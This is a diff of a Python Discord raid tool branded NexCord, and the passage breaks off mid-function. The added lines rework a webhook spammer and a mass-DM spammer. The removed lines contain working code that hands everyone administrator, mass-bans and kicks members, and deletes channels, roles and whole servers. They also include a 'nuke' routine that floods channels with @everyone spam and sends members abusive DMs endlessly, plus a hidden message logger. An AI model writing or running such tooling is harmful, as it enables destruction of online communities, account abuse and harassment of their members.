@@ -1,7 +1,8 @@
+import signal
+import sys
 import requests
 import time
 import os
-import sys
 import discord
 from discord.ext import commands
 import asyncio
@@ -9,20 +10,32 @@ import random
 from datetime import datetime
 from datetime import timedelta
 
-PINK = "\033[95m"
+RED = "\033[91m"
+GOLD = "\033[93m"
+LILA = "\033[38;5;213m"
 WHITE = "\033[97m"
 RESET = "\033[0m"
 
 BANNER = r"""
-________   _______      ___    ___ ________  ________  ________  ________     
-|\   ___  \|\  ___ \    |\  \  /  /|\   ____\|\   __  \|\   __  \|\   ___ \    
-\ \  \\ \  \ \   __/|   \ \  \/  / | \  \___|\ \  \|\  \ \  \|\  \ \  \_|\ \   
- \ \  \\ \  \ \  \_|/__  \ \    / / \ \  \    \ \  \\\  \ \   _  _\ \  \ \\ \  
-  \ \  \\ \  \ \  \_|\ \  /     \/   \ \  \____\ \  \\\  \ \  \\  \\ \  \_\\ \ 
-   \ \__\\ \__\ \_______\/  /\   \    \ \_______\ \_______\ \__\\ _\\ \_______\
-    \|__| \|__|\|_______/__/ /\ __\    \|_______|\|_______|\|__|\|__|\|_______|
-                        |__|/ \|__|                                            
+  ________   _______      ___    ___ ________  ________  ________  ________     
+ |\   ___  \|\  ___ \    |\  \  /  /|\   ____\|\   __  \|\   __  \|\   ___ \    
+ \ \  \\ \  \ \   __/|   \ \  \/  / | \  \___|\ \  \|\  \|\  \|\  \|\  \_|\ \   
+  \ \  \\ \  \ \  \_|/__  \ \    / / \ \  \    \ \  \\\  \|\   _  _\|\  \ \\ \  
+   \ \  \\ \  \ \  \_|\ \  /     \/   \ \  \____\ \  \\\  \|\  \\  \\|\  \_\\ \ 
+    \ \__\\ \__\ \_______\/  /\   \    \ \_______\ \_______\ \__\\ _\\ \_______\
+     \|__| \|__|\|_______/__/ /\ __\    \|_______|\|_______|\|__|\|__|\|_______|
+                         |__|/ \|__|                                            
 """
+
+should_exit = False
+
+def signal_handler(sig, frame):
+    global should_exit
+    print(RED + "\n\nOperation cancelled by user! Returning to main menu..." + RESET)
+    should_exit = True
+    raise KeyboardInterrupt
+
+signal.signal(signal.SIGINT, signal_handler)
 
 def clear():
     os.system("cls" if os.name == "nt" else "clear")
@@ -34,1092 +47,3166 @@ def set_title(title: str):
         sys.stdout.write(f"\33]0;{title}\a")
         sys.stdout.flush()
 
-def webhook_sender():
-    clear()
-    print(PINK + BANNER + RESET)
-    print(WHITE + "[ Discord Webhook Sender ]\n" + RESET)
-    webhook_url = input(WHITE + "Enter the Webhook URL: " + RESET).strip()
-    message = input(WHITE + "Enter the message: " + RESET).strip()
-    amount = int(input(WHITE + "How many times should the message be sent? " + RESET))
-    delay = float(input(WHITE + "Delay between messages in seconds (e.g., 0.5 or 0.01): " + RESET))
+def return_to_menu():
+    input(RED + "Press [Enter] to return to main menu..." + RESET)
 
-    data = {"content": message}
-    for i in range(amount):
-        response = requests.post(webhook_url, json=data)
-        if response.status_code in (200, 204):
-            print(WHITE + f"Message {i+1}/{amount} sent successfully." + RESET)
-        else:
-            print(WHITE + f"Error sending message {i+1}: {response.status_code} - {response.text}" + RESET)
+def webhook_sender():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Discord Webhook Sender ]\n" + RESET)
+        webhook_url = input(WHITE + "Enter the Webhook URL: " + RESET).strip()
+        
+        if not webhook_url:
+            print(RED + "No webhook URL provided!" + RESET)
+            return_to_menu()
+            return
+            
+        message = input(WHITE + "Enter the message: " + RESET).strip()
+        amount = int(input(WHITE + "How many times should the message be sent? " + RESET))
+        delay = float(input(WHITE + "Delay between messages in seconds (e.g., 0.5 or 0.01): " + RESET))
+
+        print(RED + "\nPress Ctrl+C at any time to cancel and return to main menu..." + RESET)
+        time.sleep(1)
+
+        data = {"content": message}
+        for i in range(amount):
+            if should_exit:
+                print(RED + "Operation cancelled!" + RESET)
+                break
+                
+            try:
+                response = requests.post(webhook_url, json=data, timeout=10)
+                if response.status_code in (200, 204):
+                    print(WHITE + f"Message {i+1}/{amount} sent successfully." + RESET)
+                else:
+                    print(RED + f"Error sending message {i+1}: {response.status_code}" + RESET)
+            except Exception as e:
+                print(RED + f"Error sending message {i+1}: {e}" + RESET)
+            
+            if not should_exit and i < amount - 1:
+                time.sleep(delay)
+                
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
 
 def dm_all_tool():
-    clear()
-    print(PINK + BANNER + RESET)
-    print(WHITE + "[ DM All - Host Bot From Token ]\n" + RESET)
-    TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
-    GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
-    MESSAGE = input(WHITE + "Enter the message to DM all members: " + RESET)
-    AMOUNT = int(input(WHITE + "How many times should the message be sent to each member? " + RESET))
-    DELAY = float(input(WHITE + "Delay between messages in seconds (e.g., 0.5 or 0.01): " + RESET))
-
-    intents = discord.Intents.default()
-    intents.members = True
-    bot = commands.Bot(command_prefix="!", intents=intents)
-
-    @bot.event
-    async def on_ready():
-        guild = bot.get_guild(GUILD_ID)
-        if not guild:
-            print(WHITE + "Guild not found!" + RESET)
-            await bot.close()
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ DM All - Host Bot From Token ]\n" + RESET)
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
             return
-        count = 0
-        for member in guild.members:
-            if not member.bot:
-                for _ in range(AMOUNT):
-                    try:
-                        await member.send(MESSAGE)
-                        count += 1
-                        await asyncio.sleep(DELAY)
-                    except:
-                        pass
-        print(WHITE + f"\nSent message {AMOUNT} times to each member ({count} total messages)." + RESET)
-        await bot.close()
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        MESSAGE = input(WHITE + "Enter the message to DM all members: " + RESET)
+        AMOUNT = int(input(WHITE + "How many times should the message be sent to each member? " + RESET))
+        DELAY = float(input(WHITE + "Delay between messages in seconds (e.g., 0.5 or 0.01): " + RESET))
 
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(bot.start(TOKEN))
+        print(RED + "\nPress Ctrl+C at any time to cancel and return to main menu..." + RESET)
 
-def reaction_spammer_tool():
-    clear()
-    print(PINK + BANNER + RESET)
-    print(WHITE + "[ Reaction Spammer - Auto Multi-Emoji ]\n" + RESET)
-    TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
-    GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
-    DELAY = float(input(WHITE + "Delay between reactions in seconds (e.g., 0.5): " + RESET))
+        intents = discord.Intents.default()
+        intents.members = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
 
-    standard_emojis = [
-        "😀","😃","😄","😁","😆","😅","😂","🤣","😊","😇","🙂","🙃","😉","😌","😍",
-        "🥰","😘","😗","😙","😚","😋","😛","😝","😜","🤪","🤨","🧐","🤓","😎","🥳",
-        "🤩","🥺","😏","😒","😞","😔","😟","😕","🙁","☹️","😣","😖","😫","😩","🥱",
-        "😤","😠","😡","🤬","😶","😐","😑","😯","😦","😧","😮","😲","🥵","🥶","😱",
-        "😨","😰","😥","😓","🤗","🤔","🤭","🤫","🤥","😶‍🌫️","😐","😑","😬","🙄","😯"
-    ]
-
-    intents = discord.Intents.default()
-    intents.messages = True
-    intents.guilds = True
-    intents.members = True
-    bot = commands.Bot(command_prefix="!", intents=intents)
-
-    @bot.event
-    async def on_ready():
-        guild = bot.get_guild(GUILD_ID)
-        if not guild:
-            print(WHITE + "Guild not found!" + RESET)
-            await bot.close()
-            return
-        async def react_channel(channel):
+        @bot.event
+        async def on_ready():
+            global should_exit
             try:
-                async for message in channel.history(limit=None):
-                    emojis_to_use = random.sample(standard_emojis, k=16)
-                    for emoji in emojis_to_use:
-                        try:
-                            await message.add_reaction(emoji)
-                            await asyncio.sleep(DELAY)
-                        except:
-                            continue
-            except:
-                pass
-        tasks = [react_channel(channel) for channel in guild.text_channels]
-        await asyncio.gather(*tasks)
-        print(WHITE + "\nFinished reacting to all messages." + RESET)
-        await bot.close()
-
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(bot.start(TOKEN))
-
-def nickname_changer_tool():
-    clear()
-    print(PINK + BANNER + RESET)
-    print(WHITE + "[ Nickname Changer ]\n" + RESET)
-    TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
-    GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
-
-    intents = discord.Intents.default()
-    intents.members = True
-    bot = commands.Bot(command_prefix="!", intents=intents)
-
-    @bot.event
-    async def on_ready():
-        guild = bot.get_guild(GUILD_ID)
-        while True:
-            USER_ID = int(input(WHITE + "Enter user ID to change nickname: " + RESET))
-            NEW_NICK = input(WHITE + "Enter new nickname: " + RESET)
-            member = guild.get_member(USER_ID)
-            if not member:
-                print(WHITE + "User not found!" + RESET)
-            else:
-                try:
-                    await member.edit(nick=NEW_NICK)
-                    print(WHITE + f"Nickname of {member} changed to {NEW_NICK}" + RESET)
-                except:
-                    print(WHITE + "Failed to change nickname!" + RESET)
-            choice = input(WHITE + "Type 1 to continue changing nicknames or B to return to main menu: " + RESET).strip()
-            if choice.upper() == "B":
+                guild = bot.get_guild(GUILD_ID)
+                if not guild:
+                    print(RED + "Guild not found!" + RESET)
+                    await bot.close()
+                    return
+                
+                count = 0
+                for member in guild.members:
+                    if should_exit:
+                        print(RED + "Operation cancelled!" + RESET)
+                        break
+                        
+                    if not member.bot:
+                        for i in range(AMOUNT):
+                            if should_exit:
+                                break
+                            try:
+                                await member.send(MESSAGE)
+                                count += 1
+                                if not should_exit:
+                                    await asyncio.sleep(DELAY)
+                            except:
+                                pass
+                
+                if not should_exit:
+                    print(WHITE + f"Sent message {AMOUNT} times to each member ({count} total messages)." + RESET)
+                    
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
                 await bot.close()
-                break
 
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(bot.start(TOKEN))
-
-def admin_user_tool():
-    clear()
-    print(PINK + BANNER + RESET)
-    print(WHITE + "[ Admin User ]\n" + RESET)
-    TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
-    GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
-    USER_ID = int(input(WHITE + "Enter user ID to give admin: " + RESET))
-
-    intents = discord.Intents.default()
-    intents.members = True
-    bot = commands.Bot(command_prefix="!", intents=intents)
-
-    @bot.event
-    async def on_ready():
-        guild = bot.get_guild(GUILD_ID)
-        member = guild.get_member(USER_ID)
-        if not member:
-            print(WHITE + "User not found!" + RESET)
-        else:
-            try:
-                role = await guild.create_role(name="NexCordKing", permissions=discord.Permissions(administrator=True))
-                await member.add_roles(role)
-                await role.edit(position=guild.me.top_role.position - 1)
-                print(WHITE + f"Admin role given to {member}" + RESET)
-            except:
-                print(WHITE + "Failed to give admin!" + RESET)
-        await bot.close()
-
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(bot.start(TOKEN))
-
-def admin_all_tool():
-    clear()
-    print(PINK + BANNER + RESET)
-    print(WHITE + "[ Admin All ]\n" + RESET)
-    TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
-    GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
-
-    intents = discord.Intents.default()
-    intents.members = True
-    bot = commands.Bot(command_prefix="!", intents=intents)
-
-    @bot.event
-    async def on_ready():
-        guild = bot.get_guild(GUILD_ID)
-        try:
-            role = await guild.create_role(name="NexCordKing", permissions=discord.Permissions(administrator=True))
-            await role.edit(position=guild.me.top_role.position - 1)
-            for member in guild.members:
-                await member.add_roles(role)
-            print(WHITE + "Admin role given to everyone!" + RESET)
-        except:
-            print(WHITE + "Failed to give admin to all!" + RESET)
-        await bot.close()
-
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(bot.start(TOKEN))
-
-def role_giver_user_tool():
-    clear()
-    print(PINK + BANNER + RESET)
-    print(WHITE + "[ Role Giver (User) ]\n" + RESET)
-    TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
-    GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
-    USER_ID = int(input(WHITE + "Enter user ID: " + RESET))
-    ROLE_INPUT = input(WHITE + "Enter Role ID or Role Name: " + RESET).strip()
-
-    intents = discord.Intents.default()
-    intents.members = True
-    bot = commands.Bot(command_prefix="!", intents=intents)
-
-    @bot.event
-    async def on_ready():
-        guild = bot.get_guild(GUILD_ID)
-        member = guild.get_member(USER_ID)
-        role = None
-        for r in guild.roles:
-            if str(r.id) == ROLE_INPUT or r.name == ROLE_INPUT:
-                role = r
-                break
-        if not member:
-            print(WHITE + "User not found!" + RESET)
-        elif not role:
-            print(WHITE + "Role not found!" + RESET)
-        else:
-            try:
-                await member.add_roles(role)
-                print(WHITE + f"Role {role.name} given to {member}" + RESET)
-            except:
-                print(WHITE + "Failed to give role!" + RESET)
-        await bot.close()
-
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(bot.start(TOKEN))
-
-def role_giver_everybody_tool():
-    clear()
-    print(PINK + BANNER + RESET)
-    print(WHITE + "[ Role Giver (Everybody) ]\n" + RESET)
-    TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
-    GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
-    ROLE_INPUT = input(WHITE + "Enter Role ID or Role Name: " + RESET).strip()
-
-    intents = discord.Intents.default()
-    intents.members = True
-    bot = commands.Bot(command_prefix="!", intents=intents)
-
-    @bot.event
-    async def on_ready():
-        guild = bot.get_guild(GUILD_ID)
-        role = None
-        for r in guild.roles:
-            if str(r.id) == ROLE_INPUT or r.name == ROLE_INPUT:
-                role = r
-                break
-        if not role:
-            print(WHITE + "Role not found!" + RESET)
-        else:
-            for member in guild.members:
-                try:
-                    await member.add_roles(role)
-                except:
-                    continue
-            print(WHITE + f"Role {role.name} given to everyone!" + RESET)
-        await bot.close()
-
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(bot.start(TOKEN))
-
-def channel_deleter_tool():
-    clear()
-    print(PINK + BANNER + RESET)
-    print(WHITE + "[ Channel Deleter (Single) ]\n" + RESET)
-    TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
-    GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
-    CHANNEL_ID = int(input(WHITE + "Enter channel ID to delete: " + RESET))
-    CONFIRM = input(WHITE + "Are you sure? Type YES to confirm: " + RESET).strip()
-    if CONFIRM.upper() != "YES":
-        print(WHITE + "Cancelled." + RESET)
-        return
-
-    intents = discord.Intents.default()
-    intents.guilds = True
-    bot = commands.Bot(command_prefix="!", intents=intents)
-
-    @bot.event
-    async def on_ready():
-        guild = bot.get_guild(GUILD_ID)
-        channel = guild.get_channel(CHANNEL_ID)
-        if not channel:
-            print(WHITE + "Channel not found!" + RESET)
-        else:
-            try:
-                await channel.delete()
-                print(WHITE + f"Channel {channel.name} deleted!" + RESET)
-            except:
-                print(WHITE + "Failed to delete channel!" + RESET)
-        await bot.close()
-
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(bot.start(TOKEN))
-
-def channel_deleter_all_tool():
-    clear()
-    print(PINK + BANNER + RESET)
-    print(WHITE + "[ Channel Deleter (All) ]\n" + RESET)
-    TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
-    GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
-    CONFIRM = input(WHITE + "Use at your own risk! Type YES to confirm deletion of ALL channels: " + RESET).strip()
-    if CONFIRM.upper() != "YES":
-        print(WHITE + "Cancelled." + RESET)
-        return
-
-    intents = discord.Intents.default()
-    intents.guilds = True
-    bot = commands.Bot(command_prefix="!", intents=intents)
-
-    @bot.event
-    async def on_ready():
-        guild = bot.get_guild(GUILD_ID)
-        for channel in guild.channels:
-            try:
-                await channel.delete()
-            except:
-                continue
-        print(WHITE + "All channels deleted!" + RESET)
-        await bot.close()
-
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(bot.start(TOKEN))
-
-def server_deleter_tool():
-    clear()
-    print(PINK + BANNER + RESET)
-    print(WHITE + "[ Server Deleter ]\n" + RESET)
-    TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
-    GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
-    CONFIRM = input(WHITE + "WARNING! This will delete everything on the server. Type YES to confirm: " + RESET).strip()
-    if CONFIRM.upper() != "YES":
-        print(WHITE + "Cancelled." + RESET)
-        return
-
-    intents = discord.Intents.default()
-    intents.guilds = True
-    intents.members = True
-    bot = commands.Bot(command_prefix="!", intents=intents)
-
-    @bot.event
-    async def on_ready():
-        guild = bot.get_guild(GUILD_ID)
-        if not guild:
-            print(WHITE + "Guild not found!" + RESET)
-            await bot.close()
-            return
-
-        # Delete channels
-        for channel in guild.channels:
-            try:
-                await channel.delete()
-            except:
-                continue
-
-        # Delete roles (except bot top role)
-        for role in guild.roles:
-            try:
-                if role < guild.me.top_role:
-                    await role.delete()
-            except:
-                continue
-
-        # Change server name and description
-        try:
-            await guild.edit(
-                name="Deleted by NexCord",
-                description="NEXCORD ON TOP",
-                icon=await (await bot.http_session.get("https://i0.wp.com/digitalhealthskills.com/wp-content/uploads/2022/11/3da39-no-user-image-icon-27.png?fit=500%2C500&ssl=1")).read()
-            )
-        except:
-            print(WHITE + "Failed to edit server info or icon!" + RESET)
-
-        print(WHITE + "Server deletion completed!" + RESET)
-        await bot.close()
-
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(bot.start(TOKEN))
-
-def nuker_tool():
-    clear()
-    print(PINK + BANNER + RESET)
-    print(WHITE + "[ Nuke Tool - ultra fast + continuous spam ]\n" + RESET)
-
-    TOKEN = input(WHITE + "Enter your bot token: " + RESET).strip()
-    GUILD_ID = int(input(WHITE + "Enter your test server ID: " + RESET))
-
-    confirm = input(WHITE + "⚠️ WARNING: This will delete ALL channels and roles on the server! Type yes to continue: " + RESET).strip()
-    if confirm.lower() != "yes":
-        print(WHITE + "Cancelled." + RESET)
-        input(WHITE + "Press [Enter] to return to main menu..." + RESET)
-        return
-
-    intents = discord.Intents.default()
-    intents.guilds = True
-    intents.members = True
-    intents.messages = True
-    bot = commands.Bot(command_prefix="!", intents=intents)
-
-    @bot.event
-    async def on_ready():
-        guild = bot.get_guild(GUILD_ID)
-        if not guild:
-            print(WHITE + "Server not found!" + RESET)
-            await bot.close()
-            return
-
-        # Servername ändern
-        try:
-            await guild.edit(name="𝓝𝓮𝓍𝓒𝓸𝓻𝓭 𝓞𝓷 𝓣𝓸𝓹")
-            print(WHITE + f"Server name changed to: {guild.name}" + RESET)
-        except Exception as e:
-            print(WHITE + f"Failed to change server name: {e}" + RESET)
-
-        # Channels löschen ultraschnell
-        print(WHITE + "Deleting all channels..." + RESET)
-        delete_channel_tasks = [channel.delete() for channel in guild.channels]
-        await asyncio.gather(*delete_channel_tasks, return_exceptions=True)
-
-        # Rollen löschen, die gelöscht werden können
-        print(WHITE + "Deleting all deletable roles..." + RESET)
-        delete_role_tasks = [role.delete() for role in guild.roles if role < guild.me.top_role and not role.managed]
-        await asyncio.gather(*delete_role_tasks, return_exceptions=True)
-
-        # Admin-Rolle erstellen
-        try:
-            admin_role = await guild.create_role(
-                name="𝓝𝓔𝓧𝓒𝓞𝓡𝓓 𝓝𝓤𝓚𝓔",
-                permissions=discord.Permissions(administrator=True),
-                colour=discord.Colour.red()
-            )
-            print(WHITE + f"Created role: {admin_role.name}" + RESET)
-        except Exception as e:
-            print(WHITE + f"Failed to create admin role: {e}" + RESET)
-            admin_role = None
-
-        # Rolle sofort allen Mitgliedern geben, ohne zu warten
-        if admin_role:
-            for member in guild.members:
-                try:
-                    await member.add_roles(admin_role, atomic=False)
-                except:
-                    continue
-
-        # Neue Channels erstellen
-        print(WHITE + "Creating 20 new channels..." + RESET)
-        create_tasks = [guild.create_text_channel(f"𝓝𝓮𝓍𝓒𝓸𝓻𝓭 𝓞𝓷 𝓣𝓸𝓹-{i+1}") for i in range(20)]
-        new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
-
-        for ch in new_channels:
-            if isinstance(ch, Exception):
-                print(WHITE + f"Error creating a channel: {ch}" + RESET)
-            else:
-                print(WHITE + f"Created: {ch.name}" + RESET)
-
-        # Kontinuierlich Nachrichten senden parallel
-        async def spam_channel(channel):
-            while True:
-                try:
-                    await channel.send("@everyone 𝓝𝓤𝓚𝓔𝓓 𝓑𝓨 𝓝𝓔𝓧𝓒𝓞𝓡𝓓")
-                    await channel.send("@everyone 𝓖𝓔𝓣 𝓕𝓤𝓒𝓚𝓘𝓝𝓖 𝓝𝓤𝓚𝓔𝓓 𝓑𝓨 𝓝𝓔𝓧𝓒𝓞𝓡𝓓")
-                    await asyncio.sleep(2)
-                except Exception as e:
-                    print(WHITE + f"Error sending messages in {channel.name}: {e}" + RESET)
-                    break
-
-        for ch in new_channels:
-            if not isinstance(ch, Exception):
-                asyncio.create_task(spam_channel(ch))
-
-        # DM-Loop starten parallel
-        async def dm_members():
-            while True:
-                for member in guild.members:
-                    try:
-                        await member.send("Hey you fucker, one of the servers you were in just got nuked by Nexcord. Hope you like it!")
-                    except:
-                        continue
-                await asyncio.sleep(2)  # 2 Sekunden Pause nach allen DMs
-
-        asyncio.create_task(dm_members())
-
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(bot.start(TOKEN))
-
-def kick_user_tool():
-    clear()
-    print(PINK + BANNER + RESET)
-    print(WHITE + "[ Kick User ]\n" + RESET)
-    
-    TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
-    GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
-    USER_ID = int(input(WHITE + "Enter user ID to kick: " + RESET))
-
-    intents = discord.Intents.default()
-    intents.members = True
-    bot = commands.Bot(command_prefix="!", intents=intents)
-
-    @bot.event
-    async def on_ready():
-        guild = bot.get_guild(GUILD_ID)
-        member = guild.get_member(USER_ID)
-        if not member:
-            print(WHITE + "User not found!" + RESET)
-        else:
-            try:
-                await member.kick(reason="Kicked via moderation tool")
-                print(WHITE + f"User {member} was kicked!" + RESET)
-            except Exception as e:
-                print(WHITE + f"Failed to kick user: {e}" + RESET)
-        await bot.close()
-
-    asyncio.run(bot.start(TOKEN))
-
-def kick_all_tool():
-    clear()
-    print(PINK + BANNER + RESET)
-    print(WHITE + "[ Kick All Members ]\n" + RESET)
-    
-    TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
-    GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
-    EXCLUDE_IDS = input(WHITE + "Enter user IDs to exclude (comma-separated, e.g., 123,456) or leave empty: " + RESET)
-    exclude_ids = [int(uid.strip()) for uid in EXCLUDE_IDS.split(",") if uid.strip().isdigit()]
-
-    intents = discord.Intents.default()
-    intents.members = True
-    bot = commands.Bot(command_prefix="!", intents=intents)
-
-    @bot.event
-    async def on_ready():
-        guild = bot.get_guild(GUILD_ID)
-        count = 0
-        for member in guild.members:
-            if not member.bot and member.id not in exclude_ids and member != guild.me:
-                try:
-                    await member.kick(reason="Kicked via moderation tool")
-                    count += 1
-                except:
-                    continue
-        print(WHITE + f"Kicked {count} members." + RESET)
-        await bot.close()
-
-    asyncio.run(bot.start(TOKEN))
-
-def ban_all_tool():
-    clear()
-    print(PINK + BANNER + RESET)
-    print(WHITE + "[ Ban All Members ]\n" + RESET)
-    
-    TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
-    GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
-    EXCLUDE_IDS = input(WHITE + "Enter user IDs to exclude (comma-separated, e.g., 123,456) or leave empty: " + RESET)
-    exclude_ids = [int(uid.strip()) for uid in EXCLUDE_IDS.split(",") if uid.strip().isdigit()]
-
-    intents = discord.Intents.default()
-    intents.members = True
-    bot = commands.Bot(command_prefix="!", intents=intents)
-
-    @bot.event
-    async def on_ready():
-        guild = bot.get_guild(GUILD_ID)
-        count = 0
-        for member in guild.members:
-            if not member.bot and member.id not in exclude_ids and member != guild.me:
-                try:
-                    await member.ban(reason="Banned via moderation tool")
-                    count += 1
-                except:
-                    continue
-        print(WHITE + f"Banned {count} members." + RESET)
-        await bot.close()
-
-    asyncio.run(bot.start(TOKEN))
-
-def ban_user_tool():
-    clear()
-    print(PINK + BANNER + RESET)
-    print(WHITE + "[ Ban User ]\n" + RESET)
-    
-    TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
-    GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
-    USER_ID = int(input(WHITE + "Enter user ID to ban: " + RESET))
-
-    intents = discord.Intents.default()
-    intents.members = True
-    bot = commands.Bot(command_prefix="!", intents=intents)
-
-    @bot.event
-    async def on_ready():
-        guild = bot.get_guild(GUILD_ID)
-        member = guild.get_member(USER_ID)
-        if not member:
-            print(WHITE + "User not found!" + RESET)
-        else:
-            try:
-                await member.ban(reason="Banned via moderation tool")
-                print(WHITE + f"User {member} was banned!" + RESET)
-            except Exception as e:
-                print(WHITE + f"Failed to ban user: {e}" + RESET)
-        await bot.close()
-
-    asyncio.run(bot.start(TOKEN))
-
-def timeout_user_tool():
-    clear()
-    print(PINK + BANNER + RESET)
-    print(WHITE + "[ Timeout User ]\n" + RESET)
-    
-    TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
-    GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
-    USER_ID = int(input(WHITE + "Enter user ID to timeout: " + RESET))
-    DURATION = int(input(WHITE + "Enter timeout duration in seconds: " + RESET))
-    REASON = input(WHITE + "Enter reason for timeout: " + RESET)
-
-    intents = discord.Intents.default()
-    intents.members = True
-    bot = commands.Bot(command_prefix="!", intents=intents)
-
-    @bot.event
-    async def on_ready():
-        guild = bot.get_guild(GUILD_ID)
-        member = guild.get_member(USER_ID)
-        if not member:
-            print(WHITE + "User not found!" + RESET)
-        else:
-            try:
-                await member.timeout(duration=discord.utils.timedelta(seconds=DURATION), reason=REASON)
-                print(WHITE + f"User {member} timed out for {DURATION} seconds." + RESET)
-            except Exception as e:
-                print(WHITE + f"Failed to timeout user: {e}" + RESET)
-        await bot.close()
-
-    asyncio.run(bot.start(TOKEN))
-
-
-def timeout_all_tool():
-    clear()
-    print(PINK + BANNER + RESET)
-    print(WHITE + "[ Timeout All Members ]\n" + RESET)
-    
-    TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
-    GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
-    EXCLUDE_IDS = input(WHITE + "Enter user IDs to exclude (comma-separated) or leave empty: " + RESET)
-    exclude_ids = [int(uid.strip()) for uid in EXCLUDE_IDS.split(",") if uid.strip().isdigit()]
-    DURATION = int(input(WHITE + "Enter timeout duration in seconds: " + RESET))
-    REASON = input(WHITE + "Enter reason for timeout: " + RESET)
-
-    intents = discord.Intents.default()
-    intents.members = True
-    bot = commands.Bot(command_prefix="!", intents=intents)
-
-    @bot.event
-    async def on_ready():
-        guild = bot.get_guild(GUILD_ID)
-        count = 0
-        for member in guild.members:
-            if not member.bot and member.id not in exclude_ids and member != guild.me:
-                try:
-                    await member.timeout(duration=discord.utils.timedelta(seconds=DURATION), reason=REASON)
-                    count += 1
-                except:
-                    continue
-        print(WHITE + f"Timed out {count} members for {DURATION} seconds." + RESET)
-        await bot.close()
-
-    asyncio.run(bot.start(TOKEN))
-
-def message_logger_tool():
-    clear()
-    print(PINK + BANNER + RESET)
-    print(WHITE + "[ Message Logger - prints all messages with details ]\n" + RESET)
-    
-    TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
-    GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
-    
-    intents = discord.Intents.all()  # alle Intents aktivieren, inkl. messages, members
-    bot = commands.Bot(command_prefix="!", intents=intents)
-    
-    from datetime import datetime
-    import re
-
-    url_pattern = re.compile(r'https?://\S+')
-
-    def log_message(event_type, message):
-        category = message.channel.category.name if message.channel.category else "No Category"
-        content = message.content if message.content else ""
-        links = url_pattern.findall(content)
-        attachments = [att.url for att in message.attachments]
-        
-        print(f"\n[{datetime.now()}] {event_type}")
-        print(f"Author   : {message.author}")
-        print(f"Category : {category}")
-        print(f"Channel  : {message.channel.name}")
-        if content:
-            print(f"Message  : {content}")
-        if links:
-            print(f"Links    : {', '.join(links)}")
-        if attachments:
-            print(f"Attachments : {', '.join(attachments)}")
-
-    @bot.event
-    async def on_ready():
-        print(WHITE + f"Bot ready! Logging all messages for guild ID {GUILD_ID}..." + RESET)
-
-    @bot.event
-    async def on_message(message):
-        if message.guild and message.guild.id == GUILD_ID:
-            log_message("Sent", message)
-        await bot.process_commands(message)
-
-    @bot.event
-    async def on_message_delete(message):
-        if message.guild and message.guild.id == GUILD_ID:
-            log_message("Deleted", message)
-
-    bot.run(TOKEN)
-
-def log_event(event_str):
-    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    print(f"[{now}] {event_str}")
-
-def server_logger_tool():
-    clear()
-    print(PINK + BANNER + RESET)
-    print(WHITE + "[ Discord Full Server Logger Tool ]\n" + RESET)
-
-    TOKEN = input(WHITE + "Enter your Bot Token: " + RESET).strip()
